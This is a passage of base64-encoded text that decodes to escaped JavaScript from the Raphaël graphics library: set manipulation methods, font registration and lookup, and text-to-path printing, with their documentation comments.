CAgICAgICAgICB9XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSB0aGlzLml0ZW1zLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICB0aGlzLml0ZW1zW2ldLmF0dHIobmFtZSwgdmFsdWUpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFNldC5jbGVhclxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBhbGwgZWxlbWVudHMgZnJvbSB0aGUgc2V0XG4gICAgXFwqL1xuICAgIHNldHByb3RvLmNsZWFyID0gZnVuY3Rpb24gKCkge1xuICAgICAgICB3aGlsZSAodGhpcy5sZW5ndGgpIHtcbiAgICAgICAgICAgIHRoaXMucG9wKCk7XG4gICAgICAgIH1cbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBTZXQuc3BsaWNlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZW1vdmVzIGdpdmVuIGVsZW1lbnQgZnJvbSB0aGUgc2V0XG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIGluZGV4IChudW1iZXIpIHBvc2l0aW9uIG9mIHRoZSBkZWxldGlvblxuICAgICAtIGNvdW50IChudW1iZXIpIG51bWJlciBvZiBlbGVtZW50IHRvIHJlbW92ZVxuICAgICAtIGluc2VydGlvbuKApiAob2JqZWN0KSAjb3B0aW9uYWwgZWxlbWVudHMgdG8gaW5zZXJ0XG4gICAgID0gKG9iamVjdCkgc2V0IGVsZW1lbnRzIHRoYXQgd2VyZSBkZWxldGVkXG4gICAgXFwqL1xuICAgIHNldHByb3RvLnNwbGljZSA9IGZ1bmN0aW9uIChpbmRleCwgY291bnQsIGluc2VydGlvbikge1xuICAgICAgICBpbmRleCA9IGluZGV4IDwgMCA/IG1tYXgodGhpcy5sZW5ndGggKyBpbmRleCwgMCkgOiBpbmRleDtcbiAgICAgICAgY291bnQgPSBtbWF4KDAsIG1taW4odGhpcy5sZW5ndGggLSBpbmRleCwgY291bnQpKTtcbiAgICAgICAgdmFyIHRhaWwgPSBbXSxcbiAgICAgICAgICAgIHRvZGVsID0gW10sXG4gICAgICAgICAgICBhcmdzID0gW10sXG4gICAgICAgICAgICBpO1xuICAgICAgICBmb3IgKGkgPSAyOyBpIDwgYXJndW1lbnRzLmxlbmd0aDsgaSsrKSB7XG4gICAgICAgICAgICBhcmdzLnB1c2goYXJndW1lbnRzW2ldKTtcbiAgICAgICAgfVxuICAgICAgICBmb3IgKGkgPSAwOyBpIDwgY291bnQ7IGkrKykge1xuICAgICAgICAgICAgdG9kZWwucHVzaCh0aGlzW2luZGV4ICsgaV0pO1xuICAgICAgICB9XG4gICAgICAgIGZvciAoOyBpIDwgdGhpcy5sZW5ndGggLSBpbmRleDsgaSsrKSB7XG4gICAgICAgICAgICB0YWlsLnB1c2godGhpc1tpbmRleCArIGldKTtcbiAgICAgICAgfVxuICAgICAgICB2YXIgYXJnbGVuID0gYXJncy5sZW5ndGg7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBhcmdsZW4gKyB0YWlsLmxlbmd0aDsgaSsrKSB7XG4gICAgICAgICAgICB0aGlzLml0ZW1zW2luZGV4ICsgaV0gPSB0aGlzW2luZGV4ICsgaV0gPSBpIDwgYXJnbGVuID8gYXJnc1tpXSA6IHRhaWxbaSAtIGFyZ2xlbl07XG4gICAgICAgIH1cbiAgICAgICAgaSA9IHRoaXMuaXRlbXMubGVuZ3RoID0gdGhpcy5sZW5ndGggLT0gY291bnQgLSBhcmdsZW47XG4gICAgICAgIHdoaWxlICh0aGlzW2ldKSB7XG4gICAgICAgICAgICBkZWxldGUgdGhpc1tpKytdO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBuZXcgU2V0KHRvZGVsKTtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBTZXQuZXhjbHVkZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBnaXZlbiBlbGVtZW50IGZyb20gdGhlIHNldFxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBlbGVtZW50IChvYmplY3QpIGVsZW1lbnQgdG8gcmVtb3ZlXG4gICAgID0gKGJvb2xlYW4pIGB0cnVlYCBpZiBvYmplY3Qgd2FzIGZvdW5kICYgcmVtb3ZlZCBmcm9tIHRoZSBzZXRcbiAgICBcXCovXG4gICAgc2V0cHJvdG8uZXhjbHVkZSA9IGZ1bmN0aW9uIChlbCkge1xuICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSB0aGlzLmxlbmd0aDsgaSA8IGlpOyBpKyspIGlmICh0aGlzW2ldID09IGVsKSB7XG4gICAgICAgICAgICB0aGlzLnNwbGljZShpLCAxKTtcbiAgICAgICAgICAgIHJldHVybiB0cnVlO1xuICAgICAgICB9XG4gICAgfTtcbiAgICBzZXRwcm90by5hbmltYXRlID0gZnVuY3Rpb24gKHBhcmFtcywgbXMsIGVhc2luZywgY2FsbGJhY2spIHtcbiAgICAgICAgKFIuaXMoZWFzaW5nLCBcImZ1bmN0aW9uXCIpIHx8ICFlYXNpbmcpICYmIChjYWxsYmFjayA9IGVhc2luZyB8fCBudWxsKTtcbiAgICAgICAgdmFyIGxlbiA9IHRoaXMuaXRlbXMubGVuZ3RoLFxuICAgICAgICAgICAgaSA9IGxlbixcbiAgICAgICAgICAgIGl0ZW0sXG4gICAgICAgICAgICBzZXQgPSB0aGlzLFxuICAgICAgICAgICAgY29sbGVjdG9yO1xuICAgICAgICBpZiAoIWxlbikge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgY2FsbGJhY2sgJiYgKGNvbGxlY3RvciA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICEtLWxlbiAmJiBjYWxsYmFjay5jYWxsKHNldCk7XG4gICAgICAgIH0pO1xuICAgICAgICBlYXNpbmcgPSBSLmlzKGVhc2luZywgc3RyaW5nKSA/IGVhc2luZyA6IGNvbGxlY3RvcjtcbiAgICAgICAgdmFyIGFuaW0gPSBSLmFuaW1hdGlvbihwYXJhbXMsIG1zLCBlYXNpbmcsIGNvbGxlY3Rvcik7XG4gICAgICAgIGl0ZW0gPSB0aGlzLml0ZW1zWy0taV0uYW5pbWF0ZShhbmltKTtcbiAgICAgICAgd2hpbGUgKGktLSkge1xuICAgICAgICAgICAgdGhpcy5pdGVtc1tpXSAmJiAhdGhpcy5pdGVtc1tpXS5yZW1vdmVkICYmIHRoaXMuaXRlbXNbaV0uYW5pbWF0ZVdpdGgoaXRlbSwgYW5pbSwgYW5pbSk7XG4gICAgICAgICAgICAodGhpcy5pdGVtc1tpXSAmJiAhdGhpcy5pdGVtc1tpXS5yZW1vdmVkKSB8fCBsZW4tLTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gdGhpcztcbiAgICB9O1xuICAgIHNldHByb3RvLmluc2VydEFmdGVyID0gZnVuY3Rpb24gKGVsKSB7XG4gICAgICAgIHZhciBpID0gdGhpcy5pdGVtcy5sZW5ndGg7XG4gICAgICAgIHdoaWxlIChpLS0pIHtcbiAgICAgICAgICAgIHRoaXMuaXRlbXNbaV0uaW5zZXJ0QWZ0ZXIoZWwpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgc2V0cHJvdG8uZ2V0QkJveCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgdmFyIHggPSBbXSxcbiAgICAgICAgICAgIHkgPSBbXSxcbiAgICAgICAgICAgIHgyID0gW10sXG4gICAgICAgICAgICB5MiA9IFtdO1xuICAgICAgICBmb3IgKHZhciBpID0gdGhpcy5pdGVtcy5sZW5ndGg7IGktLTspIGlmICghdGhpcy5pdGVtc1tpXS5yZW1vdmVkKSB7XG4gICAgICAgICAgICB2YXIgYm94ID0gdGhpcy5pdGVtc1tpXS5nZXRCQm94KCk7XG4gICAgICAgICAgICB4LnB1c2goYm94LngpO1xuICAgICAgICAgICAgeS5wdXNoKGJveC55KTtcbiAgICAgICAgICAgIHgyLnB1c2goYm94LnggKyBib3gud2lkdGgpO1xuICAgICAgICAgICAgeTIucHVzaChib3gueSArIGJveC5oZWlnaHQpO1xuICAgICAgICB9XG4gICAgICAgIHggPSBtbWluW2FwcGx5XSgwLCB4KTtcbiAgICAgICAgeSA9IG1taW5bYXBwbHldKDAsIHkpO1xuICAgICAgICB4MiA9IG1tYXhbYXBwbHldKDAsIHgyKTtcbiAgICAgICAgeTIgPSBtbWF4W2FwcGx5XSgwLCB5Mik7XG4gICAgICAgIHJldHVybiB7XG4gICAgICAgICAgICB4OiB4LFxuICAgICAgICAgICAgeTogeSxcbiAgICAgICAgICAgIHgyOiB4MixcbiAgICAgICAgICAgIHkyOiB5MixcbiAgICAgICAgICAgIHdpZHRoOiB4MiAtIHgsXG4gICAgICAgICAgICBoZWlnaHQ6IHkyIC0geVxuICAgICAgICB9O1xuICAgIH07XG4gICAgc2V0cHJvdG8uY2xvbmUgPSBmdW5jdGlvbiAocykge1xuICAgICAgICBzID0gdGhpcy5wYXBlci5zZXQoKTtcbiAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gdGhpcy5pdGVtcy5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICBzLnB1c2godGhpcy5pdGVtc1tpXS5jbG9uZSgpKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gcztcbiAgICB9O1xuICAgIHNldHByb3RvLnRvU3RyaW5nID0gZnVuY3Rpb24gKCkge1xuICAgICAgICByZXR1cm4gXCJSYXBoYVxceGVibFxcdTIwMThzIHNldFwiO1xuICAgIH07XG5cbiAgICBzZXRwcm90by5nbG93ID0gZnVuY3Rpb24oZ2xvd0NvbmZpZykge1xuICAgICAgICB2YXIgcmV0ID0gdGhpcy5wYXBlci5zZXQoKTtcbiAgICAgICAgdGhpcy5mb3JFYWNoKGZ1bmN0aW9uKHNoYXBlLCBpbmRleCl7XG4gICAgICAgICAgICB2YXIgZyA9IHNoYXBlLmdsb3coZ2xvd0NvbmZpZyk7XG4gICAgICAgICAgICBpZihnICE9IG51bGwpe1xuICAgICAgICAgICAgICAgIGcuZm9yRWFjaChmdW5jdGlvbihzaGFwZTIsIGluZGV4Mil7XG4gICAgICAgICAgICAgICAgICAgIHJldC5wdXNoKHNoYXBlMik7XG4gICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0pO1xuICAgICAgICByZXR1cm4gcmV0O1xuICAgIH07XG5cblxuICAgIC8qXFxcbiAgICAgKiBTZXQuaXNQb2ludEluc2lkZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogRGV0ZXJtaW5lIGlmIGdpdmVuIHBvaW50IGlzIGluc2lkZSB0aGlzIHNldOKAmXMgZWxlbWVudHNcbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0geCAobnVtYmVyKSB4IGNvb3JkaW5hdGUgb2YgdGhlIHBvaW50XG4gICAgIC0geSAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIHBvaW50XG4gICAgID0gKGJvb2xlYW4pIGB0cnVlYCBpZiBwb2ludCBpcyBpbnNpZGUgYW55IG9mIHRoZSBzZXQncyBlbGVtZW50c1xuICAgICBcXCovXG4gICAgc2V0cHJvdG8uaXNQb2ludEluc2lkZSA9IGZ1bmN0aW9uICh4LCB5KSB7XG4gICAgICAgIHZhciBpc1BvaW50SW5zaWRlID0gZmFsc2U7XG4gICAgICAgIHRoaXMuZm9yRWFjaChmdW5jdGlvbiAoZWwpIHtcbiAgICAgICAgICAgIGlmIChlbC5pc1BvaW50SW5zaWRlKHgsIHkpKSB7XG4gICAgICAgICAgICAgICAgaXNQb2ludEluc2lkZSA9IHRydWU7XG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOyAvLyBzdG9wIGxvb3BcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSk7XG4gICAgICAgIHJldHVybiBpc1BvaW50SW5zaWRlO1xuICAgIH07XG5cbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5yZWdpc3RlckZvbnRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgZ2l2ZW4gZm9udCB0byB0aGUgcmVnaXN0ZXJlZCBzZXQgb2YgZm9udHMgZm9yIFJhcGhhw6tsLiBTaG91bGQgYmUgdXNlZCBhcyBhbiBpbnRlcm5hbCBjYWxsIGZyb20gd2l0aGluIEN1ZsOzbuKAmXMgZm9udCBmaWxlLlxuICAgICAqIFJldHVybnMgb3JpZ2luYWwgcGFyYW1ldGVyLCBzbyBpdCBjb3VsZCBiZSB1c2VkIHdpdGggY2hhaW5pbmcuXG4gICAgICMgPGEgaHJlZj1cImh0dHA6Ly93aWtpLmdpdGh1Yi5jb20vc29yY2N1L2N1Zm9uL2Fib3V0XCI+TW9yZSBhYm91dCBDdWbDs24gYW5kIGhvdyB0byBjb252ZXJ0IHlvdXIgZm9udCBmb3JtIFRURiwgT1RGLCBldGMgdG8gSmF2YVNjcmlwdCBmaWxlLjwvYT5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gZm9udCAob2JqZWN0KSB0aGUgZm9udCB0byByZWdpc3RlclxuICAgICA9IChvYmplY3QpIHRoZSBmb250IHlvdSBwYXNzZWQgaW5cbiAgICAgPiBVc2FnZVxuICAgICB8IEN1Zm9uLnJlZ2lzdGVyRm9udChSYXBoYWVsLnJlZ2lzdGVyRm9udCh74oCmfSkpO1xuICAgIFxcKi9cbiAgICBSLnJlZ2lzdGVyRm9udCA9IGZ1bmN0aW9uIChmb250KSB7XG4gICAgICAgIGlmICghZm9udC5mYWNlKSB7XG4gICAgICAgICAgICByZXR1cm4gZm9udDtcbiAgICAgICAgfVxuICAgICAgICB0aGlzLmZvbnRzID0gdGhpcy5mb250cyB8fCB7fTtcbiAgICAgICAgdmFyIGZvbnRjb3B5ID0ge1xuICAgICAgICAgICAgICAgIHc6IGZvbnQudyxcbiAgICAgICAgICAgICAgICBmYWNlOiB7fSxcbiAgICAgICAgICAgICAgICBnbHlwaHM6IHt9XG4gICAgICAgICAgICB9LFxuICAgICAgICAgICAgZmFtaWx5ID0gZm9udC5mYWNlW1wiZm9udC1mYW1pbHlcIl07XG4gICAgICAgIGZvciAodmFyIHByb3AgaW4gZm9udC5mYWNlKSBpZiAoZm9udC5mYWNlW2hhc10ocHJvcCkpIHtcbiAgICAgICAgICAgIGZvbnRjb3B5LmZhY2VbcHJvcF0gPSBmb250LmZhY2VbcHJvcF07XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHRoaXMuZm9udHNbZmFtaWx5XSkge1xuICAgICAgICAgICAgdGhpcy5mb250c1tmYW1pbHldLnB1c2goZm9udGNvcHkpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdGhpcy5mb250c1tmYW1pbHldID0gW2ZvbnRjb3B5XTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoIWZvbnQuc3ZnKSB7XG4gICAgICAgICAgICBmb250Y29weS5mYWNlW1widW5pdHMtcGVyLWVtXCJdID0gdG9JbnQoZm9udC5mYWNlW1widW5pdHMtcGVyLWVtXCJdLCAxMCk7XG4gICAgICAgICAgICBmb3IgKHZhciBnbHlwaCBpbiBmb250LmdseXBocykgaWYgKGZvbnQuZ2x5cGhzW2hhc10oZ2x5cGgpKSB7XG4gICAgICAgICAgICAgICAgdmFyIHBhdGggPSBmb250LmdseXBoc1tnbHlwaF07XG4gICAgICAgICAgICAgICAgZm9udGNvcHkuZ2x5cGhzW2dseXBoXSA9IHtcbiAgICAgICAgICAgICAgICAgICAgdzogcGF0aC53LFxuICAgICAgICAgICAgICAgICAgICBrOiB7fSxcbiAgICAgICAgICAgICAgICAgICAgZDogcGF0aC5kICYmIFwiTVwiICsgcGF0aC5kLnJlcGxhY2UoL1ttbGN4dHJ2XS9nLCBmdW5jdGlvbiAoY29tbWFuZCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB7bDogXCJMXCIsIGM6IFwiQ1wiLCB4OiBcInpcIiwgdDogXCJtXCIsIHI6IFwibFwiLCB2OiBcImNcIn1bY29tbWFuZF0gfHwgXCJNXCI7XG4gICAgICAgICAgICAgICAgICAgICAgICB9KSArIFwielwiXG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgICAgICBpZiAocGF0aC5rKSB7XG4gICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGsgaW4gcGF0aC5rKSBpZiAocGF0aFtoYXNdKGspKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBmb250Y29weS5nbHlwaHNbZ2x5cGhdLmtba10gPSBwYXRoLmtba107XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIGZvbnQ7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUGFwZXIuZ2V0Rm9udFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogRmluZHMgZm9udCBvYmplY3QgaW4gdGhlIHJlZ2lzdGVyZWQgZm9udHMgYnkgZ2l2ZW4gcGFyYW1ldGVycy4gWW91IGNvdWxkIHNwZWNpZnkgb25seSBvbmUgd29yZCBmcm9tIHRoZSBmb250IG5hbWUsIGxpa2Ug4oCcTXlyaWFk4oCdIGZvciDigJxNeXJpYWQgUHJv4oCdLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBmYW1pbHkgKHN0cmluZykgZm9udCBmYW1pbHkgbmFtZSBvciBhbnkgd29yZCBmcm9tIGl0XG4gICAgIC0gd2VpZ2h0IChzdHJpbmcpICNvcHRpb25hbCBmb250IHdlaWdodFxuICAgICAtIHN0eWxlIChzdHJpbmcpICNvcHRpb25hbCBmb250IHN0eWxlXG4gICAgIC0gc3RyZXRjaCAoc3RyaW5nKSAjb3B0aW9uYWwgZm9udCBzdHJldGNoXG4gICAgID0gKG9iamVjdCkgdGhlIGZvbnQgb2JqZWN0XG4gICAgID4gVXNhZ2VcbiAgICAgfCBwYXBlci5wcmludCgxMDAsIDEwMCwgXCJUZXN0IHN0cmluZ1wiLCBwYXBlci5nZXRGb250KFwiVGltZXNcIiwgODAwKSwgMzApO1xuICAgIFxcKi9cbiAgICBwYXBlcnByb3RvLmdldEZvbnQgPSBmdW5jdGlvbiAoZmFtaWx5LCB3ZWlnaHQsIHN0eWxlLCBzdHJldGNoKSB7XG4gICAgICAgIHN0cmV0Y2ggPSBzdHJldGNoIHx8IFwibm9ybWFsXCI7XG4gICAgICAgIHN0eWxlID0gc3R5bGUgfHwgXCJub3JtYWxcIjtcbiAgICAgICAgd2VpZ2h0ID0gK3dlaWdodCB8fCB7bm9ybWFsOiA0MDAsIGJvbGQ6IDcwMCwgbGlnaHRlcjogMzAwLCBib2xkZXI6IDgwMH1bd2VpZ2h0XSB8fCA0MDA7XG4gICAgICAgIGlmICghUi5mb250cykge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIHZhciBmb250ID0gUi5mb250c1tmYW1pbHldO1xuICAgICAgICBpZiAoIWZvbnQpIHtcbiAgICAgICAgICAgIHZhciBuYW1lID0gbmV3IFJlZ0V4cChcIihefFxcXFxzKVwiICsgZmFtaWx5LnJlcGxhY2UoL1teXFx3XFxkXFxzKyF+LjpfLV0vZywgRSkgKyBcIihcXFxcc3wkKVwiLCBcImlcIik7XG4gICAgICAgICAgICBmb3IgKHZhciBmb250TmFtZSBpbiBSLmZvbnRzKSBpZiAoUi5mb250c1toYXNdKGZvbnROYW1lKSkge1xuICAgICAgICAgICAgICAgIGlmIChuYW1lLnRlc3QoZm9udE5hbWUpKSB7XG4gICAgICAgICAgICAgICAgICAgIGZvbnQgPSBSLmZvbnRzW2ZvbnROYW1lXTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHZhciB0aGVmb250O1xuICAgICAgICBpZiAoZm9udCkge1xuICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gZm9udC5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgdGhlZm9udCA9IGZvbnRbaV07XG4gICAgICAgICAgICAgICAgaWYgKHRoZWZvbnQuZmFjZVtcImZvbnQtd2VpZ2h0XCJdID09IHdlaWdodCAmJiAodGhlZm9udC5mYWNlW1wiZm9udC1zdHlsZVwiXSA9PSBzdHlsZSB8fCAhdGhlZm9udC5mYWNlW1wiZm9udC1zdHlsZVwiXSkgJiYgdGhlZm9udC5mYWNlW1wiZm9udC1zdHJldGNoXCJdID09IHN0cmV0Y2gpIHtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGVmb250O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLnByaW50XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBDcmVhdGVzIHBhdGggdGhhdCByZXByZXNlbnQgZ2l2ZW4gdGV4dCB3cml0dGVuIHVzaW5nIGdpdmVuIGZvbnQgYXQgZ2l2ZW4gcG9zaXRpb24gd2l0aCBnaXZlbiBzaXplLlxuICAgICAqIFJlc3VsdCBvZiB0aGUgbWV0aG9kIGlzIHBhdGggZWxlbWVudCB0aGF0IGNvbnRhaW5zIHdob2xlIHRleHQgYXMgYSBzZXBhcmF0ZSBwYXRoLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSB4IChudW1iZXIpIHggcG9zaXRpb24gb2YgdGhlIHRleHRcbiAgICAgLSB5IChudW1iZXIpIHkgcG9zaXRpb24gb2YgdGhlIHRleHRcbiAgICAgLSBzdHJpbmcgKHN0cmluZykgdGV4dCB0byBwcmludFxuICAgICAtIGZvbnQgKG9iamVjdCkgZm9udCBvYmplY3QsIHNlZSBAUGFwZXIuZ2V0Rm9udFxuICAgICAtIHNpemUgKG51bWJlcikgI29wdGlvbmFsIHNpemUgb2YgdGhlIGZvbnQsIGRlZmF1bHQgaXMgYDE2YFxuICAgICAtIG9yaWdpbiAoc3RyaW5nKSAjb3B0aW9uYWwgY291bGQgYmUgYFwiYmFzZWxpbmVcImAgb3IgYFwibWlkZGxlXCJgLCBkZWZhdWx0IGlzIGBcIm1pZGRsZVwiYFxuICAgICAtIGxldHRlcl9zcGFjaW5nIChudW1iZXIpICNvcHRpb25hbCBudW1iZXIgaW4gcmFuZ2UgYC0xLi4xYCwgZGVmYXVsdCBpcyBgMGBcbiAgICAgLSBsaW5lX3NwYWNpbmcgKG51bWJlcikgI29wdGlvbmFsIG51bWJlciBpbiByYW5nZSBgMS4uM2AsIGRlZmF1bHQgaXMgYDFgXG4gICAgID0gKG9iamVjdCkgcmVzdWx0aW5nIHBhdGggZWxlbWVudCwgd2hpY2ggY29uc2lzdCBvZiBhbGwgbGV0dGVyc1xuICAgICA+IFVzYWdlXG4gICAgIHwgdmFyIHR4dCA9IHIucHJpbnQoMTAsIDUwLCBcInByaW50XCIsIHIuZ2V0Rm9udChcIk11c2VvXCIpLCAzMCkuYXR0cih7ZmlsbDogXCIjZmZmXCJ9KTtcbiAgICBcXCovXG4gICAgcGFwZXJwcm90by5wcmludCA9IGZ1bmN0aW9uICh4LCB5LCBzdHJpbmcsIGZvbnQsIHNpemUsIG9yaWdpbiwgbGV0dGVyX3NwYWNpbmcsIGxpbmVfc3BhY2luZykge1xuICAgICAgICBvcmlnaW4gPSBvcmlnaW4gfHwgXCJtaWRkbGVcIjsgLy8gYmFzZWxpbmV8bWlkZGxlXG4gICAgICAgIGxldHRlcl9zcGFjaW5nID0gbW1heChtbWluKGxldHRlcl9zcGFjaW5nIHx8IDAsIDEpLCAtMSk7XG4gICAgICAgIGxpbmVfc3BhY2luZyA9IG1tYXgobW1pbihsaW5lX3NwYWNpbmcgfHwgMSwgMyksIDEpO1xuICAgICAgICB2YXIgbGV0dGVycyA9IFN0cihzdHJpbmcpW3NwbGl0XShFKSxcbiAgICAgICAgICAgIHNoaWZ0ID0gMCxcbiAgICAgICAgICAgIG5vdGZpcnN0ID0gMCxcbiAgICAgICAgICAgIHBhdGggPSBFLFxuICAgICAgICAgICAgc2NhbGU7XG4gICAgICAgIFIuaXMoZm9udCwgXCJzdHJpbmdcIikgJiYgKGZvbnQgPSB0aGlzLmdldEZvbnQoZm9udCkpO1xuICAgICAgICBpZiAoZm9udCkge1xuICAgICAgICAgICAgc2NhbGUgPSAoc2l6ZSB8fCAxNikgLyBmb250LmZhY2VbXCJ1bml0cy1wZXItZW1cIl07XG4gICAgICAgICAgICB2YXIgYmIgPSBmb250LmZhY2UuYmJveFtzcGxpdF0oc2VwYXJhdG9yKSxcbiAgICAgICAgICAgICAgICB0b3AgPSArYmJbMF0sXG4gICAgICAgICAgICAgICAgbGluZUhlaWdodCA9IGJiWzNdIC0gYmJbMV0sXG4gICAgICAgICAgICAgICAgc2hpZnR5ID0gMCxcbiAgICAgICAgICAgICAgICBoZWlnaHQgPSArYmJbMV0gKyAob3JpZ2luID09IFwiYmFzZWxpbmVcIiA/IGxpbmVIZWlnaHQgKyAoK2ZvbnQuZmFjZS5kZXNjZW50KSA6IGxpbmVIZWlnaHQgLyAyKTtcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IGxldHRlcnMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgIGlmIChsZXR0ZXJzW2ldID09IFwiXFxuXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgc2hpZnQgPSAwO1xuICAgICAgICAgICAgICAgICAgICBjdXJyID0gMDtcbiAgICAgICAgICAgICAgICAgICAgbm90Zmlyc3QgPSAwO1xuICAgICAgICAgICAgICAgICAgICBzaGlmdHkgKz0gbGluZUhlaWdodCAqIGxpbmVfc3BhY2luZztcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICB2YXIgcHJldiA9IG5vdGZpcnN0ICYmIGZvbnQuZ2x5cGhzW2xldHRlcnNbaSAtIDFdXSB8fCB7fSxcbiAgICAgICAgICAgICAgICAgICAgICAgIGN1cnIgPSBmb250LmdseXBoc1tsZXR0ZXJzW2ldXTtcbiAgICAgICAgICAgICAgICAgICAgc2hpZnQgKz0gbm90Zmlyc3QgPyAocHJldi53IHx8IGZvbnQudykgKyAocHJldi5rICYmIHByZXYua1tsZXR0ZXJzW2ldXSB8fCAwKSArIChmb250LncgKiBsZXR0ZXJfc3BhY2luZykgOiAwO1xuICAgICAgICAgICAgICAgICAgICBub3RmaXJzdCA9IDE7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGlmIChjdXJyICYmIGN1cnIuZCkge1xuICAgICAgICAgICAgICAgICAgICBwYXRoICs9IFIudHJhbnNmb3JtUGF0aChjdXJyLmQsIFtcInRcIiwgc2hpZnQgKiBzY2FsZSwgc2hpZnR5ICogc2NhbGUsIFwic1wiLCBzY2FsZSwgc2NhbGUsIHRvcCwgaGVpZ2h0LCBcInRcIiwgKHggLSB0b3ApIC8gc2NhbGUsICh5IC0gaGVpZ2h0KSAvIHNjYWxlXSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzLnBhdGgocGF0aCkuYXR0cih7XG4gICAgICAgICAgICBmaWxsOiBcIiMwMDBcIixcbiAgICAgICAgICAgIHN0cm9rZTogXCJub25lXCJcbiAgICAgICAgfSk7XG4gICAgfTtcblxuICAgIC8qXFxcbiAgICAgKiBQYXBlci5hZGRcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEltcG9ydHMgZWxlbWVudHMgaW4gSlNPTiBhcnJheSBpbiBmb3JtYXQgYHt0eXBlOiB0eXBlLCA8YXR0cmlidXRlcz59YFxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBqc29uIChhcnJheSlcbiAgICAgPSAob2JqZWN0KSByZXN1bHRpbmcgc2V0IG9mIGltcG9ydGVkIGVsZW1lbnRzXG4gICAgID4gVXNhZ2VcbiAgICAgfCBwYXBlci5hZGQoW1xuICAgICB8ICAgICB7XG4gICAgIHwgICAgICAgICB0eXBlOiBcImNpcmNsZVwiLFxuICAgICB8ICAgICAgICAgY3g6IDEwLFxuICAgICB8ICAgICAgICAgY3k6IDEwLFxuICAgICB8ICAgICAgICAgcjogNVxuICAgICB8ICAgICB9LFxuICAgICB8ICAgICB7XG4gICAgIHwgICAgICAgICB0eXBlOiBcInJlY3RcIixcbiAgICAgfCAgICAgICAgIHg6IDEwLFxuICAgICB8ICAgICAgICAgeTogMTAsXG4gICAgIHwgICAgICAgICB3aWR0aDogMTAsXG4gICAgIHwgICAgICAgICBoZWlnaHQ6IDEwLFxuICAgICB8ICAgIC